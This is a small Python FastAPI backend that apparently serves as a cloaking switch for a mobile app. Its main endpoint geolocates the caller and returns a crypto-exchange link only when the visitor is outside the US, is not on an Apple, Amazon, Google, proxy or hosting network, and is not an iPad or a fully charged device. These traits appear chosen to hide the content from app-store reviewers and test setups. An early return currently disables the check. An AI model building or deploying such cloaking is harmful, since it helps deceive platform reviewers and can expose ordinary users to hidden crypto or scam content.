from fastapi import FastAPI, Request
from pydantic import BaseModel
import httpx

app = FastAPI()


class DeviceStatus(BaseModel):
    batteryLevel: int
    isIpad: bool


@app.post("/")
async def root(device_status: DeviceStatus, request: Request):
    return {"result": False}
    client_ip = request.client.host
    if request.headers.get("X-Forwarded-For"):
        client_ip = request.headers.get("X-Forwarded-For").split(",")[0].strip()
    elif request.headers.get("X-Real-IP"):
        client_ip = request.headers.get("X-Real-IP")
    isp_block_list = ["Apple Inc.", "Apple Inc", "Amazon.com, Inc.", "Google LLC"]

    geo_data = {}
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(f"http://ip-api.com/json/{client_ip}?fields=status,country,countryCode,isp,proxy,hosting")
            if response.status_code == 200:
                geo_data = response.json()
    except Exception:
        return {"result": False}
    
    if geo_data.get("status") == "success":
        if geo_data.get("countryCode") == "US":
            return {"result": False}
        
        if geo_data.get("isp") in isp_block_list:
            return {"result": False}
        
        if geo_data.get("proxy"):
            return {"result": False}

        if geo_data.get("hosting"):
            return {"result": False}
    
    if device_status.batteryLevel == 100 or device_status.isIpad:
        return {"result": False}
    else:
        return {"result": True, "info_url": "https://pancakeswap.finance/"}


@app.get("/hello/{name}")
async def say_hello(name: str):
    return {"message": f"Hello {name}"}


@app.get("/api-url")
async def get_api_url():
    return {"apiUrl": "https://pancake-backend-164860087792.europe-west1.run.app"}
